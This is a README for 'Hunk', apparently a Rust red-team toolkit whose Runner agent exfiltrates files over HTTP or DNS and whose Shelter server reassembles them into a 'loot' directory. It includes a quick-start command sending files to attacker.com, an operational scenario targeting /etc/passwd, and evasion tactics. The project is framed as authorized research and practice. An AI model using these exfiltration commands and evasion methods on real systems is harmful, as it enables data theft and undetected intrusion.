# Hunk - Red Team Exfiltration Toolkit

## Overview

**Hunk** is a comprehensive Rust-based toolkit for researching and practicing data exfiltration techniques commonly used in Red Team engagements. The project is a Cargo workspace containing two specialized tools: **Runner** (client-side exfiltration agent) and **Shelter** (server-side receiver).

This project emerged with two primary objectives in mind:

1. **Practice Rust Programming** — Develop proficiency in Rust by building real-world security tools (with or without AI assistance)
2. **Research Exfiltration Mechanisms** — Explore and understand various covert data exfiltration channels and encoding techniques used in offensive security operations

## Project Structure

```
hunk/
├── runner/          # Client-side exfiltration agent
├── shelter/         # Server-side file receiver
├── Cargo.toml       # Workspace configuration
└── README.md        # This file
```

### Runner

**Runner** is a command-line tool that exfiltrates files from a compromised system using multiple covert channels:

- **HTTP Exfiltration** — Send encoded file chunks via HTTP POST requests
- **DNS Tunneling** — Exfiltrate data through DNS TXT queries (includes TCP/UDP support)
- **Configurable Encoding** — Base64 + hex encoding for payload obfuscation
- **Chunk-based Transfer** — Split files into configurable chunks with inter-packet delays for stealth

**Quick Start:**
```bash
cargo run --release -p runner -- exfil http \
  --src-files /path/to/file.txt \
  -u https://attacker.com/receive \
  --chunks 10 \
  --delay 500
```

See `runner/README.md` for detailed documentation.

### Shelter

**Shelter** is a server-side receiver that accepts exfiltrated file portions from Runner and reconstructs them on disk:

- **HTTP Server** — Listen for POST requests containing encoded file portions
- **In-Memory Assembly** — Accumulate and reorder file chunks using deterministic ordering
- **Asynchronous Processing** — Non-blocking file reconstruction and disk persistence
- **Error Resilience** — Graceful handling of malformed payloads with comprehensive logging

**Quick Start:**
```bash
cargo run --release -p shelter -- http-server \
  -l 0.0.0.0:8080 \
  --output-dir ./loot
```

See `shelter/README.md` for detailed documentation.

## End-to-End Workflow

```
┌──────────────────────┐
│  Compromised System  │
│  (Runner Agent)      │
└──────────────┬───────┘
               │ Encodes & sends file chunks
               ▼
        HTTP/DNS Channel
               │
               ▼
┌──────────────────────┐
│  Attacker Server     │
│  (Shelter Receiver)  │
└──────────────┬───────┘
               │ Assembles & reconstructs
               ▼
         Loot Directory
      (Exfiltrated Files)
```

## Building the Project

### Prerequisites
- Rust 1.70+ (install from [rustup.rs](https://rustup.rs/))
- Cargo (included with Rust)

### Build All Components
```bash
# Build both Runner and Shelter in release mode
cargo build --release

# Binaries available at:
# - target/release/runner
# - target/release/shelter
```

### Build Specific Component
```bash
# Build only Runner
cargo build --release -p runner

# Build only Shelter
cargo build --release -p shelter
```

## Operational Model

### Scenario: Exfiltrate Sensitive Files

1. **Attacker compromises a system** and deploys the Runner binary
2. **Runner encodes and fragments** target files (e.g., `/etc/passwd`, database dumps)
3. **Runner transmits chunks** to attacker's Shelter server via HTTP or DNS
4. **Shelter receives, decodes, and assembles** file portions in real-time
5. **Reconstructed files** are written to the loot directory for analysis

### Stealth Considerations

- **Configurable delays** between chunk transmissions to avoid detection
- **Multiple exfiltration channels** (HTTP, DNS) to evade network monitoring
- **Nested encoding** (base64 + hex) to obfuscate payloads from pattern matching
- **DNS tunneling** leverages legitimate DNS traffic to bypass firewall rules

## Learning Goals

This project serves as a practical learning platform for:

- **Rust fundamentals** — Async/await, error handling, CLI argument parsing, networking
- **Cryptography & Encoding** — Base64, hex encoding, DNS protocol constraints
- **Network Programming** — HTTP servers (Actix-web), DNS client/server implementation
- **Systems Programming** — File I/O, process spawning, environment configuration
- **Security Concepts** — Data exfiltration, covert channels, operational security

## Research Topics Covered

- **Protocol-based Exfiltration** — Using HTTP and DNS as covert data channels
- **Encoding Obfuscation** — Nested encoding schemes to evade detection
- **Asynchronous Processing** — Non-blocking I/O for high-performance data handling
- **Error Resilience** — Handling incomplete/out-of-order data chunks
- **Network Stealth** — Inter-packet delays and DNS tunneling for evasion

## Disclaimer

⚠️ **LEGAL NOTICE**

This toolkit is provided for **authorized Red Team engagements and security research purposes only**. Unauthorized access to computer systems and unauthorized data exfiltration are illegal in most jurisdictions.

**Before using this toolkit:**
- Obtain explicit written authorization from system owners
- Ensure compliance with all applicable laws and regulations
- Follow responsible disclosure practices
- Document all authorized security activities

**No Warranty:** This software is provided "as is" without any warranty. The authors assume no liability for misuse or damages resulting from its use.

See individual component README files for additional security considerations and disclaimers.

## Contributing

Contributions are welcome! Please ensure:
1. Code follows Rust idioms and passes `cargo fmt` and `cargo clippy`
2. New features include documentation and error handling
3. Security implications are carefully considered

## License

See the LICENSE file in the repository root for details.

## Quick Reference

| Tool | Purpose | Commands |
|------|---------|----------|
| **Runner** | Data exfiltration agent | `exfil http`, `exfil dns` |
| **Shelter** | File receiver & reconstructor | `http-server` |

For detailed documentation on each component, see:
- `runner/README.md` — HTTP and DNS exfiltration techniques
- `shelter/README.md` — File reconstruction and persistence

---

**Version:** 0.1.0  
**Language:** Rust  
**Edition:** 2021  
**Status:** Active Development
